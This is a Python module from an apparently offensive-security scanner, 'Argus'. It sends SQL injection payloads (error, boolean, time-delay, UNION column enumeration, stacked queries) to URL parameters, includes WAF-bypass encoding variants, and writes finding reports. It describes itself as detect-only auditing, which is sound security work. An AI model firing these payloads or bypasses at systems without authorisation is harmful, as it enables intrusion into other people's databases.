#!/usr/bin/env python3
"""
auditing_tools/sqli_finder.py — SQL Injection Auditor
═══════════════════════════════════════════════════════════════════════════════

Comprehensive SQL injection detection for Argus.

Four independent oracles, combined conservatively:

  1. Error-based
     Syntax perturbations that provoke DBMS-specific errors. A NEW error
     signature (not present in baseline) is the strongest single signal.

  2. Boolean-based blind
     Paired TRUE/FALSE conditions with reversed ordering on the confirmation
     pass. A repeatable differential where TRUE resembles baseline and FALSE
     diverges is a finding.

  3. Time-based blind
     DBMS-specific delay functions, measured against a paired control payload
     (same syntax, zero delay). A repeatable timing delta above the baseline
     noise floor is a finding.

  4. UNION-based
     Column-count enumeration via ORDER BY, followed by NULL placement and
     marker reflection. A reflected marker confirms injectable string columns.

Stacked queries are probed as a supporting signal but never exploited.

DBMS fingerprinting:
  Error text is matched against MySQL, PostgreSQL, MSSQL, Oracle, and SQLite
  signatures. Time-based and boolean payloads are adapted to the confirmed
  engine. If no engine is confirmed, all payload families are tried.

Safety model:
  • Read-only probes only — no DROP, INSERT, UPDATE, DELETE.
  • Time delays capped at 5 seconds.
  • Baseline profiling filters out dynamic pages that would produce false
    positives.
  • Every confirmation requires repeatability (2 of 3 passes).
  • The module flags candidates. It does not extract data.

Outputs (into `outdir`):
  • sqli_findings.json        — full structured report
  • sqli_candidates.txt       — flat list for triage
  • sqli_confirmed.txt        — high-confidence findings only
  • sqli_fingerprints.txt     — DBMS fingerprint per endpoint

Integration:
  main.py → run_one("sqli") → run_sqli_scan(urls_file, outdir)
"""

from __future__ import annotations

import json
import logging
import random
import re
import statistics
import string
import sys
import time
import urllib.parse
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Optional

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

log = logging.getLogger("argus.sqli_finder")

# ═════════════════════════════════════════════════════════════════════════════
#  CONFIGURATION
# ═════════════════════════════════════════════════════════════════════════════

DEFAULT_TIMEOUT      = 12
DEFAULT_RETRIES      = 1
USER_AGENT           = "Argus-SQLi-Auditor/1.0"

# Baseline profiling
BASELINE_SAMPLES     = 3
DYNAMIC_LENGTH_TOL   = 0.15     # >15% length variance = too dynamic for boolean

# Confirmation
CONFIRM_ATTEMPTS     = 3
CONFIRM_AGREEMENT    = 2        # 2 of 3 must agree

# Time-based
TIME_DELAY_SECONDS   = 5
TIME_TOLERANCE       = 0.65     # probe must exceed baseline + 65% of delay

# UNION
MAX_ORDER_BY_COLUMNS = 12
MAX_UNION_REQUESTS   = 20

# Rate limiting
REQUEST_SLEEP        = 0.08

# Scoring
SEV_CRITICAL = "CRITICAL"
SEV_HIGH     = "HIGH"
SEV_MEDIUM   = "MEDIUM"

# ── DBMS error signatures ───────────────────────────────────────────────────
DBMS_SIGNATURES: dict[str, list[str]] = {
    "mysql": [
        r"You have an error in your SQL syntax",
        r"check the manual that corresponds to your MySQL",
        r"check the manual that corresponds to your MariaDB",
        r"MariaDB server version",
        r"ERROR 1064",
        r"ERROR 1054",
        r"ERROR 1222",
        r"Warning:\s*mysqli_",
        r"Warning:\s*mysql_",
        r"MySQLSyntaxErrorException",
    ],
    "postgresql": [
        r"LINE \d+:",
        r"unterminated quoted string",
        r"invalid input syntax for type",
        r"ERROR:\s+syntax error at or near",
        r"PG::SyntaxError",
        r"psycopg2\.",
        r"org\.postgresql\.util\.PSQLException",
    ],
    "mssql": [
        r"Msg \d+, Level \d+",
        r"Unclosed quotation mark",
        r"Incorrect syntax near",
        r"System\.Data\.SqlClient\.SqlException",
        r"ODBC SQL Server Driver",
        r"Microsoft OLE DB Provider for SQL Server",
        r"All queries combined using a UNION",
    ],
    "oracle": [
        r"ORA-\d{5}",
        r"quoted string not properly terminated",
        r"SQL command not properly ended",
        r"FROM keyword not found where expected",
    ],
    "sqlite": [
        r"SQLite/JDBCDriver",
        r"sqlite3\.OperationalError",
        r"unrecognized token",
        r'near ".*": syntax error',
    ],
}

# ── Syntax perturbation payloads (error-based) ─────────────────────────────
ERROR_PAYLOADS = ["'", '"', "')", "';", "\\", "`", "/*", "%", "')-- -"]

# ── Boolean pairs ───────────────────────────────────────────────────────────
BOOLEAN_PAIRS = [
    # (label, true_payload, false_payload, context)
    ("numeric_and", " AND 1=1", " AND 1=2", "numeric"),
    ("numeric_or",  " OR 1=1",  " OR 1=2",  "numeric"),
    ("string_and",  "' AND '1'='1", "' AND '1'='2", "string"),
    ("string_or",   "' OR '1'='1",  "' OR '1'='2",  "string"),
    ("paren_string_and", "') AND ('1'='1", "') AND ('1'='2", "string"),
]

# ── Time-based payload templates ────────────────────────────────────────────
TIME_PAYLOADS: dict[str, list[tuple[str, str]]] = {
    # (label, template with {d} for delay)
    "mysql": [
        ("sleep_and",      "' AND SLEEP({d})-- -"),
        ("sleep_or",       "' OR SLEEP({d})-- -"),
        ("benchmark",      "' AND BENCHMARK(5000000,SHA1('argus'))-- -"),
    ],
    "postgresql": [
        ("pg_sleep_and",   "' AND pg_sleep({d})-- -"),
        ("pg_sleep_stack", "'; SELECT pg_sleep({d})-- -"),
    ],
    "mssql": [
        ("waitfor",        "'; WAITFOR DELAY '0:0:{d}'-- -"),
        ("waitfor_cond",   "' IF (1=1) WAITFOR DELAY '0:0:{d}'-- -"),
    ],
    "oracle": [
        ("dbms_lock",      "' AND DBMS_LOCK.SLEEP({d})=1-- -"),
        ("dbms_pipe",      "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('argus',{d})-- -"),
    ],
    "sqlite": [],  # no native delay function
}

# ── Stacked query probes ────────────────────────────────────────────────────
STACKED_PAYLOADS = ["; SELECT 1-- -", "'; SELECT 1-- -", "\"; SELECT 1-- -"]

# ── WAF bypass variants (applied only if base payload is blocked) ───────────
def _waf_variants(payload: str) -> list[str]:
    """Return obfuscated variants of a payload for WAF bypass."""
    variants = [payload]
    # Case variation on keywords
    variants.append(re.sub(
        r"\b(SELECT|UNION|AND|OR|SLEEP|WAITFOR|FROM|WHERE)\b",
        lambda m: m.group(0).swapcase(),
        payload,
        flags=re.I,
    ))
    # Inline comments on spaces
    variants.append(payload.replace(" ", "/**/"))
    # URL-encoded
    variants.append(urllib.parse.quote(payload, safe=""))
    # Double URL-encoded
    variants.append(urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe=""))
    return list(dict.fromkeys(variants))


# ═════════════════════════════════════════════════════════════════════════════
#  DATA MODELS
# ═════════════════════════════════════════════════════════════════════════════

@dataclass
class BaselineProfile:
    url: str
    param: str
    status: int = 0
    length: int = 0
    content_type: str = ""
    median_time: float = 0.0
    time_stddev: float = 0.0
    length_variance: float = 0.0
    body: str = ""
    error_signatures: set[str] = field(default_factory=set)
    stable: bool = True

    def to_dict(self) -> dict:
        return {
            "url":             self.url,
            "param":           self.param,
            "status":          self.status,
            "length":          self.length,
            "median_time":     round(self.median_time, 3),
            "time_stddev":     round(self.time_stddev, 3),
            "length_variance": round(self.length_variance, 3),
            "stable":          self.stable,
        }


@dataclass
class SQLiFinding:
    target: str
    param: str
    technique: str              # error | boolean | time | union | stacked
    severity: str = "MEDIUM"
    confidence: int = 50
    dbms: str = ""
    payload: str = ""
    evidence: str = ""
    repeatable: bool = False
    details: dict = field(default_factory=dict)

    def to_dict(self) -> dict:
        return {
            "target":     self.target,
            "param":      self.param,
            "technique":  self.technique,
            "severity":   self.severity,
            "confidence": self.confidence,
            "dbms":       self.dbms,
            "payload":    self.payload,
            "evidence":   self.evidence[:500],
            "repeatable": self.repeatable,
            "details":    self.details,
        }


@dataclass
class EndpointResult:
    url: str
    param: str
    baseline: Optional[BaselineProfile] = None
    dbms: str = ""
    findings: list[SQLiFinding] = field(default_factory=list)
    error: str = ""

    def to_dict(self) -> dict:
        return {
            "url":      self.url,
            "param":    self.param,
            "dbms":     self.dbms,
            "baseline": self.baseline.to_dict() if self.baseline else None,
            "error":    self.error,
            "findings": [f.to_dict() for f in self.findings],
        }


# ═════════════════════════════════════════════════════════════════════════════
#  UTILITIES
# ═════════════════════════════════════════════════════════════════════════════

def _load_urls(input_file: Path) -> list[str]:
    if not input_file.exists():
        return []
    urls: list[str] = []
    seen: set[str] = set()
    for line in input_file.read_text().splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        token = line.split()[0]
        if not token.startswith(("http://", "https://")):
            token = "https://" + token
        if token not in seen:
            seen.add(token)
            urls.append(token)
    return urls


def _extract_candidates(urls: list[str]) -> list[tuple[str, str]]:
    """Return (url, param) pairs for every query parameter."""
    pairs: list[tuple[str, str]] = []
    seen: set[tuple] = set()
    for url in urls:
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        for p in params:
            key = (url, p)
            if key not in seen:
                seen.add(key)
                pairs.append((url, p))
    return pairs


def _inject_param(url: str, param: str, payload: str) -> str:
    """Replace a parameter's value with the payload."""
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
    new_params = [(k, payload if k == param else v) for k, v in params]
    return urllib.parse.urlunparse(
        parsed._replace(query=urllib.parse.urlencode(new_params, safe=""))
    )


def _safe_request(
    session: requests.Session, url: str,
    timeout: int = DEFAULT_TIMEOUT,
    headers: Optional[dict] = None,
) -> Optional[requests.Response]:
    try:
        return session.get(
            url, headers=headers or {},
            timeout=timeout, allow_redirects=False, verify=False,
        )
    except requests.RequestException as e:
        log.debug(f"request failed: {url}: {e}")
        return None


def _body(resp: requests.Response, limit: int = 200_000) -> str:
    try:
        return resp.text[:limit]
    except Exception:
        return ""


def _fingerprint_errors(body: str) -> set[str]:
    """Return the set of DBMS families whose error signatures appear in body."""
    found: set[str] = set()
    for dbms, sigs in DBMS_SIGNATURES.items():
        for sig in sigs:
            if re.search(sig, body, re.I):
                found.add(dbms)
                break
    return found


def _request_with_timing(
    session: requests.Session, url: str,
    timeout: int = DEFAULT_TIMEOUT,
) -> tuple[Optional[requests.Response], float]:
    start = time.monotonic()
    resp = _safe_request(session, url, timeout=timeout)
    return resp, time.monotonic() - start


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 1 — BASELINE PROFILING
# ═════════════════════════════════════════════════════════════════════════════

def build_baseline(
    session: requests.Session, url: str, param: str,
) -> BaselineProfile:
    """
    Collect repeated normal responses to establish the noise floor.
    Records status, length, timing, content-type, and pre-existing errors.
    """
    profile = BaselineProfile(url=url, param=param)
    lengths: list[int] = []
    times: list[float] = []

    for _ in range(BASELINE_SAMPLES):
        resp, elapsed = _request_with_timing(session, url)
        if resp is None:
            time.sleep(REQUEST_SLEEP)
            continue
        body = _body(resp)
        lengths.append(len(body))
        times.append(elapsed)
        if not profile.status:
            profile.status = resp.status_code
            profile.content_type = resp.headers.get("Content-Type", "")
            profile.body = body
            profile.error_signatures = _fingerprint_errors(body)
        time.sleep(REQUEST_SLEEP)

    if not lengths:
        profile.stable = False
        return profile

    profile.length = int(statistics.median(lengths))
    profile.median_time = statistics.median(times)
    profile.time_stddev = statistics.pstdev(times) if len(times) > 1 else 0.0

    # Length variance relative to the median
    if profile.length:
        profile.length_variance = (max(lengths) - min(lengths)) / profile.length
    profile.stable = profile.length_variance <= DYNAMIC_LENGTH_TOL

    return profile


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 2 — ERROR-BASED DETECTION
# ═════════════════════════════════════════════════════════════════════════════

def test_error_based(
    session: requests.Session,
    url: str, param: str, baseline: BaselineProfile,
) -> list[SQLiFinding]:
    """
    Send syntax perturbations. A DBMS error signature that was NOT present
    in baseline is a strong finding.
    """
    findings: list[SQLiFinding] = []

    for payload in ERROR_PAYLOADS:
        test_url = _inject_param(url, param, payload)
        resp = _safe_request(session, test_url)
        time.sleep(REQUEST_SLEEP)
        if resp is None:
            continue

        body = _body(resp)
        new_errors = _fingerprint_errors(body) - baseline.error_signatures

        if new_errors:
            dbms = next(iter(new_errors))
            findings.append(SQLiFinding(
                target=url,
                param=param,
                technique="error",
                severity=SEV_CRITICAL,
                confidence=90,
                dbms=dbms,
                payload=payload,
                evidence=f"New {dbms} error introduced by payload {payload!r}",
                repeatable=True,
                details={
                    "status": resp.status_code,
                    "body_snippet": body[:400],
                    "error_families": sorted(new_errors),
                },
            ))
            return findings  # first confirmed error is enough

        # WAF / filter detection: try bypass variants if the response blocked
        if resp.status_code in (403, 406, 429, 501):
            for variant in _waf_variants(payload):
                if variant == payload:
                    continue
                v_url = _inject_param(url, param, variant)
                v_resp = _safe_request(session, v_url)
                time.sleep(REQUEST_SLEEP)
                if v_resp is None:
                    continue
                v_body = _body(v_resp)
                v_new = _fingerprint_errors(v_body) - baseline.error_signatures
                if v_new:
                    dbms = next(iter(v_new))
                    findings.append(SQLiFinding(
                        target=url,
                        param=param,
                        technique="error_waf_bypass",
                        severity=SEV_CRITICAL,
                        confidence=85,
                        dbms=dbms,
                        payload=variant,
                        evidence=f"WAF bypass variant triggered {dbms} error",
                        repeatable=True,
                        details={"original_payload": payload, "body_snippet": v_body[:400]},
                    ))
                    return findings

    return findings


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 3 — BOOLEAN-BASED BLIND
# ═════════════════════════════════════════════════════════════════════════════

def _similarity(a: str, b: str) -> float:
    """Cheap similarity ratio for boolean differentials."""
    if not a or not b:
        return 0.0
    if a == b:
        return 1.0
    # Length ratio combined with prefix equality
    len_ratio = min(len(a), len(b)) / max(len(a), len(b))
    prefix = 0
    for x, y in zip(a[:500], b[:500]):
        if x != y:
            break
        prefix += 1
    prefix_ratio = prefix / min(len(a), len(b), 500)
    return (len_ratio * 0.5) + (prefix_ratio * 0.5)


def test_boolean_blind(
    session: requests.Session,
    url: str, param: str, baseline: BaselineProfile,
) -> list[SQLiFinding]:
    """
    Paired TRUE/FALSE conditions. Requires:
      • TRUE response resembles baseline
      • FALSE response diverges from baseline
      • The differential is repeatable with reversed ordering
    """
    findings: list[SQLiFinding] = []

    if not baseline.stable:
        log.debug(f"    baseline unstable for {url}?{param} — skipping boolean")
        return findings

    for label, true_payload, false_payload, context in BOOLEAN_PAIRS:
        # Pass 1: TRUE then FALSE
        t_url = _inject_param(url, param, true_payload)
        f_url = _inject_param(url, param, false_payload)

        t_resp = _safe_request(session, t_url)
        time.sleep(REQUEST_SLEEP)
        f_resp = _safe_request(session, f_url)
        time.sleep(REQUEST_SLEEP)

        if not t_resp or not f_resp:
            continue

        t_body = _body(t_resp)
        f_body = _body(f_resp)

        sim_t = _similarity(t_body, baseline.body)
        sim_f = _similarity(f_body, baseline.body)

        # Direction check: TRUE closer to baseline than FALSE
        if not (sim_t > sim_f + 0.15):
            continue

        # Pass 2: reversed order
        f_resp2 = _safe_request(session, f_url)
        time.sleep(REQUEST_SLEEP)
        t_resp2 = _safe_request(session, t_url)
        time.sleep(REQUEST_SLEEP)

        if not t_resp2 or not f_resp2:
            continue

        sim_t2 = _similarity(_body(t_resp2), baseline.body)
        sim_f2 = _similarity(_body(f_resp2), baseline.body)

        if not (sim_t2 > sim_f2 + 0.15):
            continue

        findings.append(SQLiFinding(
            target=url,
            param=param,
            technique="boolean",
            severity=SEV_HIGH,
            confidence=80,
            payload=f"TRUE: {true_payload} | FALSE: {false_payload}",
            evidence=(
                f"Repeatable differential: TRUE≈baseline ({sim_t:.2f}, {sim_t2:.2f}), "
                f"FALSE diverges ({sim_f:.2f}, {sim_f2:.2f})"
            ),
            repeatable=True,
            details={
                "context": context,
                "true_similarity":  [round(sim_t, 3), round(sim_t2, 3)],
                "false_similarity": [round(sim_f, 3), round(sim_f2, 3)],
                "true_status":  t_resp.status_code,
                "false_status": f_resp.status_code,
            },
        ))
        return findings

    return findings


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 4 — TIME-BASED BLIND
# ═════════════════════════════════════════════════════════════════════════════

def _time_probe(
    session: requests.Session,
    url: str, param: str, payload: str,
    delay: int,
) -> tuple[bool, float]:
    """
    Send a single time-based payload and return (timed_out, elapsed).
    Timed out = the request exceeded baseline + 65% of the delay.
    """
    test_url = _inject_param(url, param, payload)
    resp, elapsed = _request_with_timing(
        session, test_url,
        timeout=delay + 10,
    )
    time.sleep(REQUEST_SLEEP)
    return resp is not None, elapsed


def test_time_based(
    session: requests.Session,
    url: str, param: str, baseline: BaselineProfile,
    dbms: str = "",
) -> list[SQLiFinding]:
    """
    Send DBMS-specific delay payloads, with a paired control payload that
    has the same syntax but zero delay. A finding requires the delayed probe
    to exceed the control by a stable margin across 2 of 3 passes.
    """
    findings: list[SQLiFinding] = []

    families = [dbms] if dbms and dbms in TIME_PAYLOADS else list(TIME_PAYLOADS.keys())

    for family in families:
        for label, template in TIME_PAYLOADS.get(family, []):
            # Delayed payload
            delayed_payload = template.format(d=TIME_DELAY_SECONDS) if "{d}" in template else template
            # Control payload (same syntax, zero delay where possible)
            control_payload = template.format(d=0) if "{d}" in template else template

            timings: list[float] = []
            control_times: list[float] = []

            for _ in range(CONFIRM_ATTEMPTS):
                _, elapsed = _time_probe(session, url, param, delayed_payload, TIME_DELAY_SECONDS)
                timings.append(elapsed)
                _, c_elapsed = _time_probe(session, url, param, control_payload, TIME_DELAY_SECONDS)
                control_times.append(c_elapsed)

            if not timings or not control_times:
                continue

            median_probe = statistics.median(timings)
            median_control = statistics.median(control_times)
            expected_threshold = baseline.median_time + (TIME_DELAY_SECONDS * TIME_TOLERANCE)

            # Count how many probes exceeded the threshold
            above = sum(1 for t in timings if t >= expected_threshold)
            control_above = sum(1 for t in control_times if t >= expected_threshold)

            if above >= CONFIRM_AGREEMENT and control_above == 0:
                findings.append(SQLiFinding(
                    target=url,
                    param=param,
                    technique="time",
                    severity=SEV_CRITICAL,
                    confidence=85,
                    dbms=family,
                    payload=delayed_payload,
                    evidence=(
                        f"Repeatable timing delay: probe median {median_probe:.2f}s "
                        f"vs control {median_control:.2f}s "
                        f"(baseline {baseline.median_time:.2f}s, threshold {expected_threshold:.2f}s)"
                    ),
                    repeatable=True,
                    details={
                        "probe_timings":   [round(t, 2) for t in timings],
                        "control_timings": [round(t, 2) for t in control_times],
                        "above_threshold": above,
                        "control_above":   control_above,
                        "delay_seconds":   TIME_DELAY_SECONDS,
                    },
                ))
                return findings

    return findings


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 5 — UNION-BASED
# ═════════════════════════════════════════════════════════════════════════════

def test_union_based(
    session: requests.Session,
    url: str, param: str, baseline: BaselineProfile,
) -> list[SQLiFinding]:
    """
    Enumerate the column count via ORDER BY, then place a unique marker in
    each NULL position and check whether it reflects into the response.
    """
    findings: list[SQLiFinding] = []
    requests_sent = 0
    marker = "ARG" + "".join(random.choices(string.ascii_uppercase + string.digits, k=6))

    # ── Column count via ORDER BY ───────────────────────────────────────────
    column_count = 0
    for n in range(1, MAX_ORDER_BY_COLUMNS + 1):
        if requests_sent >= MAX_UNION_REQUESTS:
            break
        payload = f" ORDER BY {n}-- -"
        resp = _safe_request(session, _inject_param(url, param, payload))
        requests_sent += 1
        time.sleep(REQUEST_SLEEP)
        if resp is None:
            continue
        body = _body(resp)
        new_errors = _fingerprint_errors(body) - baseline.error_signatures
        if new_errors:
            column_count = n - 1
            break

    if column_count < 1:
        return findings

    # ── UNION SELECT with NULLs + marker ────────────────────────────────────
    for position in range(column_count):
        if requests_sent >= MAX_UNION_REQUESTS:
            break
        cols = ["NULL"] * column_count
        cols[position] = f"'{marker}'"
        payload = " UNION SELECT " + ",".join(cols) + "-- -"
        resp = _safe_request(session, _inject_param(url, param, payload))
        requests_sent += 1
        time.sleep(REQUEST_SLEEP)
        if resp is None:
            continue

        body = _body(resp)
        if marker in body:
            findings.append(SQLiFinding(
                target=url,
                param=param,
                technique="union",
                severity=SEV_CRITICAL,
                confidence=95,
                payload=payload,
                evidence=f"UNION marker reflected in column {position + 1} of {column_count}",
                repeatable=True,
                details={
                    "column_count":   column_count,
                    "reflected_column": position + 1,
                    "marker":         marker,
                    "body_snippet":   body[:400],
                },
            ))
            return findings

    return findings


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 6 — STACKED QUERIES
# ═════════════════════════════════════════════════════════════════════════════

def test_stacked(
    session: requests.Session,
    url: str, param: str, baseline: BaselineProfile,
) -> list[SQLiFinding]:
    """Probe for stacked query support. Never executes a destructive query."""
    findings: list[SQLiFinding] = []

    for payload in STACKED_PAYLOADS:
        resp = _safe_request(session, _inject_param(url, param, payload))
        time.sleep(REQUEST_SLEEP)
        if resp is None:
            continue
        body = _body(resp)
        new_errors = _fingerprint_errors(body) - baseline.error_signatures
        if new_errors:
            findings.append(SQLiFinding(
                target=url,
                param=param,
                technique="stacked",
                severity=SEV_HIGH,
                confidence=70,
                dbms=next(iter(new_errors)),
                payload=payload,
                evidence="Stacked query probe produced a DBMS error",
                repeatable=False,
                details={"body_snippet": body[:400]},
            ))
            return findings

    return findings


# ═════════════════════════════════════════════════════════════════════════════
#  ORCHESTRATION
# ═════════════════════════════════════════════════════════════════════════════

def audit_endpoint(
    session: requests.Session, url: str, param: str,
    *,
    test_union: bool = True,
    test_stacked: bool = True,
) -> EndpointResult:
    """Run every SQLi oracle against one (url, param) pair."""
    result = EndpointResult(url=url, param=param)

    # ── Baseline ────────────────────────────────────────────────────────────
    baseline = build_baseline(session, url, param)
    result.baseline = baseline

    if not baseline.length:
        result.error = "baseline request failed"
        return result

    # ── Error-based ─────────────────────────────────────────────────────────
    errors = test_error_based(session, url, param, baseline)
    result.findings.extend(errors)

    # If error-based confirmed, we have the DBMS
    dbms = ""
    if errors:
        dbms = errors[0].dbms
    else:
        # Fallback: use any pre-existing error signature as a prior
        if baseline.error_signatures:
            dbms = next(iter(baseline.error_signatures))

    result.dbms = dbms

    # ── Boolean-based ───────────────────────────────────────────────────────
    if not errors:
        result.findings.extend(test_boolean_blind(session, url, param, baseline))

    # ── Time-based ──────────────────────────────────────────────────────────
    if not errors:
        result.findings.extend(test_time_based(session, url, param, baseline, dbms))

    # ── UNION ───────────────────────────────────────────────────────────────
    if test_union and not any(f.technique == "union" for f in result.findings):
        result.findings.extend(test_union_based(session, url, param, baseline))

    # ── Stacked ─────────────────────────────────────────────────────────────
    if test_stacked and not result.findings:
        result.findings.extend(test_stacked(session, url, param, baseline))

    return result


# ═════════════════════════════════════════════════════════════════════════════
#  PUBLIC ENTRY POINT
# ═════════════════════════════════════════════════════════════════════════════

def run_sqli_scan(
    urls_file: Path,
    outdir: Path,
    *,
    test_union: bool = True,
    test_stacked: bool = True,
    max_endpoints: int = 500,
    headers: Optional[dict] = None,
) -> Path:
    """
    Run the SQLi audit against every parameterised URL in `urls_file`.

    Returns the path to `sqli_findings.json`.
    """
    start = time.monotonic()

    urls = _load_urls(urls_file)
    candidates = _extract_candidates(urls)
    if len(candidates) > max_endpoints:
        log.warning(f"  Capping at {max_endpoints} (url, param) pairs (had {len(candidates)})")
        candidates = candidates[:max_endpoints]

    outdir.mkdir(parents=True, exist_ok=True)

    log.info(f"  Input  : {len(urls)} URL(s) from {urls_file.name}")
    log.info(f"  Pairs  : {len(candidates)} (url, param) candidate(s)")
    if headers:
        log.info("  Auth   : headers supplied")
    log.info("")

    if not candidates:
        log.warning("  No parameterised URLs — writing empty report")
        return _write_empty_report(outdir, urls_file, start)

    session = requests.Session()
    session.headers.update({"User-Agent": USER_AGENT})
    if headers:
        session.headers.update(headers)
    session.verify = False

    # ── Audit each pair ─────────────────────────────────────────────────────
    results: list[EndpointResult] = []
    for i, (url, param) in enumerate(candidates, 1):
        log.info(f"  [{i:>3}/{len(candidates)}] {url[:70]}  param={param}")
        try:
            result = audit_endpoint(
                session, url, param,
                test_union=test_union,
                test_stacked=test_stacked,
            )
            results.append(result)
            if result.findings:
                top = result.findings[0]
                log.info(f"           → {top.severity} ({top.technique}, {top.confidence}%)")
            elif result.dbms:
                log.info(f"           → dbms={result.dbms} (no confirmed finding)")
        except Exception as e:
            log.warning(f"           → error: {e}")
            results.append(EndpointResult(url=url, param=param, error=str(e)))

    # ── Flatten findings ────────────────────────────────────────────────────
    all_findings: list[SQLiFinding] = []
    for r in results:
        all_findings.extend(r.findings)

    # ── Deduplicate by (url, param, technique) ──────────────────────────────
    seen: set[tuple] = set()
    deduped: list[SQLiFinding] = []
    for f in all_findings:
        key = (f.target, f.param, f.technique)
        if key not in seen:
            seen.add(key)
            deduped.append(f)

    # ── Sort ────────────────────────────────────────────────────────────────
    SEV_ORDER = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}
    deduped.sort(key=lambda f: (SEV_ORDER.get(f.severity, 4), -f.confidence, f.target))

    # ── Write outputs ────────────────────────────────────────────────────────
    elapsed = time.monotonic() - start
    by_severity: dict[str, int] = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0}
    by_technique: dict[str, int] = {}
    by_dbms: dict[str, int] = {}

    for f in deduped:
        by_severity[f.severity] = by_severity.get(f.severity, 0) + 1
        by_technique[f.technique] = by_technique.get(f.technique, 0) + 1
        if f.dbms:
            by_dbms[f.dbms] = by_dbms.get(f.dbms, 0) + 1

    # Flat candidates
    candidate_lines = [
        f"{f.target}\t{f.param}\t{f.technique}\t{f.severity}\t{f.confidence}\t{f.dbms}\t{f.evidence[:120]}"
        for f in deduped
    ]
    (outdir / "sqli_candidates.txt").write_text("\n".join(candidate_lines) + "\n")

    # Confirmed (HIGH+)
    confirmed = [f for f in deduped if f.severity in ("CRITICAL", "HIGH") and f.repeatable]
    (outdir / "sqli_confirmed.txt").write_text(
        "\n".join(
            f"{f.target}\t{f.param}\t{f.technique}\t{f.dbms}\t{f.payload[:120]}"
            for f in confirmed
        ) + "\n"
    )

    # Fingerprints
    fp_lines = [
        f"{r.url}\t{r.param}\t{r.dbms or 'unknown'}"
        for r in results if r.dbms
    ]
    (outdir / "sqli_fingerprints.txt").write_text("\n".join(fp_lines) + "\n")

    # JSON report
    report = {
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "elapsed_seconds": round(elapsed, 2),
        "input_file": str(urls_file),
        "config": {
            "baseline_samples":  BASELINE_SAMPLES,
            "confirm_attempts":  CONFIRM_ATTEMPTS,
            "time_delay":        TIME_DELAY_SECONDS,
            "test_union":        test_union,
            "test_stacked":      test_stacked,
        },
        "totals": {
            "urls_input":       len(urls),
            "pairs_tested":     len(candidates),
            "total_findings":   len(deduped),
            "confirmed":        len(confirmed),
            "critical":         by_severity["CRITICAL"],
            "high":             by_severity["HIGH"],
            "medium":           by_severity["MEDIUM"],
            "low":              by_severity["LOW"],
        },
        "summary": {
            "by_severity":  by_severity,
            "by_technique": dict(sorted(by_technique.items(), key=lambda kv: -kv[1])),
            "by_dbms":      dict(sorted(by_dbms.items(), key=lambda kv: -kv[1])),
        },
        "results":  [r.to_dict() for r in results],
        "findings": [f.to_dict() for f in deduped],
    }

    json_path = outdir / "sqli_findings.json"
    json_path.write_text(json.dumps(report, indent=2, ensure_ascii=False) + "\n")

    # ── Console summary ─────────────────────────────────────────────────────
    log.info("")
    log.info("  Outputs :")
    log.info(f"    {json_path.name:<28} {len(deduped):>5} finding(s)")
    log.info(f"    sqli_candidates.txt          {len(deduped):>5} candidate(s)")
    log.info(f"    sqli_confirmed.txt           {len(confirmed):>5} confirmed")
    log.info(f"    sqli_fingerprints.txt        {len(fp_lines):>5} fingerprint(s)")

    log.info("")
    log.info(
        f"  Severity : "
        f"CRITICAL={by_severity['CRITICAL']}  "
        f"HIGH={by_severity['HIGH']}  "
        f"MEDIUM={by_severity['MEDIUM']}  "
        f"LOW={by_severity['LOW']}"
    )

    if by_dbms:
        log.info(f"  DBMS     : " + " · ".join(f"{k}({v})" for k, v in by_dbms.items()))
    if by_technique:
        log.info(f"  Technique: " + " · ".join(f"{k}({v})" for k, v in by_technique.items()))

    if confirmed:
        log.info("")
        log.info("  Confirmed findings:")
        for f in confirmed[:10]:
            log.info(f"    [{f.severity:<8}] {f.technique:<10} {f.param:<15} {f.target[:55]}")

    log.info("")
    log.info(f"  Completed in {elapsed:.1f}s")
    return json_path


def _write_empty_report(
    outdir: Path, input_file: Path, start: float,
) -> Path:
    report = {
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "elapsed_seconds": round(time.monotonic() - start, 2),
        "input_file": str(input_file),
        "config": {},
        "totals": {
            "urls_input": 0, "pairs_tested": 0, "total_findings": 0,
            "confirmed": 0, "critical": 0, "high": 0, "medium": 0, "low": 0,
        },
        "summary": {"by_severity": {}, "by_technique": {}, "by_dbms": {}},
        "results": [],
        "findings": [],
    }
    path = outdir / "sqli_findings.json"
    path.write_text(json.dumps(report, indent=2) + "\n")
    for name in ("sqli_candidates.txt", "sqli_confirmed.txt", "sqli_fingerprints.txt"):
        (outdir / name).write_text("")
    return path


# ═════════════════════════════════════════════════════════════════════════════
#  STANDALONE TEST
# ═════════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    import argparse

    logging.basicConfig(
        level=logging.INFO,
        format="%(message)s",
        handlers=[logging.StreamHandler(sys.stdout)],
    )
    base = Path(__file__).resolve().parent.parent
    default_input = base / "output" / "gf_sqli.txt"
    if not default_input.exists():
        default_input = base / "output" / "urls_with_params.txt"
    if not default_input.exists():
        default_input = base / "output" / "all_urls.txt"
    out = base / "output"

    parser = argparse.ArgumentParser(description="Argus SQLi Auditor (standalone)")
    parser.add_argument("--input", type=Path, default=default_input)
    parser.add_argument("--output", type=Path, default=out)
    parser.add_argument("--cookie", help="Session cookie")
    parser.add_argument("--max-endpoints", type=int, default=500)
    parser.add_argument("--no-union", action="store_true")
    parser.add_argument("--no-stacked", action="store_true")
    args = parser.parse_args()

    headers = {"Cookie": args.cookie} if args.cookie else None

    try:
        run_sqli_scan(
            args.input, args.output,
            test_union=not args.no_union,
            test_stacked=not args.no_stacked,
            max_endpoints=args.max_endpoints,
            headers=headers,
        )
